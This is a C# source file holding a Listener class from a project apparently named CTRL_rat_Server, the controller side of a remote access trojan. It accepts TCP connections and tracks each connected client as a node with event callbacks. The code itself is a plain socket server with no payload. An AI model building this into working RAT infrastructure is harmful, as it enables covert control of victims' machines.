using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;

namespace CTRL_rat_Server
{
    public class Listener
    {
        public Action<node, byte[]> OnCompletedRequest;
        public Action<node, int, int> OnPartialRequest;
        public Action<node> OnClose;
        public Action<node> Onconnect;
        public ManualResetEvent allDone = new ManualResetEvent(false);
        public Socket listener;
        public List<node> nodes = new List<node>();
        public bool listening;
        public void StartListening(int port)
        {
            //when port forwarding set comment
            IPHostEntry ipHostInfo = Dns.GetHostEntry(Dns.GetHostName());
            IPAddress ipAddress = IPAddress.Parse("127.0.0.1");
            IPEndPoint localEndPoint = new IPEndPoint(ipAddress, port);
            listener = new Socket(ipAddress.AddressFamily,SocketType.Stream, ProtocolType.Tcp);
            listening = true;
            try
            {
                listener.Bind(localEndPoint);
                listener.Listen(100);

                while (listening)
                {
                    // Set the event to nonsignaled state.  
                    allDone.Reset();

                    // Start an asynchronous socket to listen for connections.  
                    Console.WriteLine("Waiting for a connection...");
                    listener.BeginAccept(new AsyncCallback(AcceptCallback),listener);

                    // Wait until a connection is made before continuing.  
                    allDone.WaitOne();
                }

            }
            catch (Exception e)
            {
                MessageBox.Show(e.ToString());
            }

        }
        public void StopListening() 
        {
            listening = false;
            if (listener != null)
            {
                try { listener.Shutdown(SocketShutdown.Both); } catch (Exception e){ Console.WriteLine(e); }
                try { listener.Disconnect(false); } catch { }
                try { listener.Close(); } catch { }
                try
                {
                    foreach (node i in nodes.ToList())
                    {
                        try
                        {
                            i.dispose();
                        }
                        catch { }
                    }
                }
                catch (Exception e) { MessageBox.Show(e.ToString()); }
                listener = null;
            }
        
        }
        public void AcceptCallback(IAsyncResult ar)
        {
            // Signal the main thread to continue.  
            allDone.Set();
            if (!listening) return;
            Socket listener = (Socket)ar.AsyncState;
            Socket handler = listener.EndAccept(ar);
            node client = new node();
            client.sock = handler;
            client.isalive = true;
            client.parent = this;
            client.OnClose = OnClose;//handlers.Onclose;
            client.OnCompletedRequest = OnCompletedRequest;//handlers.Onmessage;
            client.OnPartialRequest = OnPartialRequest;//handlers.Onpartialmessage;
            client.Init();
            nodes.Add(client);
            new Thread(()=> Onconnect(client)).Start();
            Console.WriteLine("connected");
            //handler.BeginReceive(state.buffer, 0, StateObject.BufferSize, 0,new AsyncCallback(ReadCallback), state);
        }
    }
}
